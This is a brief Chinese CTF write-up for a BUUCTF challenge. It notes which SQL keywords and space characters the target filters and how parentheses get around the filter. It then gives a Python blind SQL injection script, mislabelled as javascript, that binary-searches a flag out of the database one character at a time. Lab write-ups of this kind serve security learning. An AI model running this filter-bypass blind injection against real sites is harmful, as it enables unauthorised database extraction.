1.测试过滤字符

1.1 and,or,union被过滤此时只能考虑盲注

1.2 空格，/**/，被过滤可以考虑（）括号绕过



2. 测试当ascii码值大于101时，返回数据不一样



![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/buuctf练习笔记/images/223892ED5E714AEFBED03C1C926D5879clipboard.png)



![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/buuctf练习笔记/images/BE23848B5D6C420992DDF821DC538FFEclipboard.png)

此时可以写出盲注脚本：

```javascript
import requests

url = 'http://fc1b4a8a-ce34-4958-80f7-16870eab28bb.node3.buuoj.cn/index.php'
result = ''

for x in range(1, 50):
    high = 127
    low = 32
    mid = (low + high) // 2
    while high > low:
        payload = "if(ascii(substr((select(flag)from(flag)),%d,1))>%d,1,2)" % (x, mid)
        data = {
            "id":payload
        }
        response = requests.post(url, data = data)
        if 'Hello' in response.text:
            low = mid + 1
        else:
            high = mid
        mid = (low + high) // 2

    result += chr(int(mid))
    print(result)
```





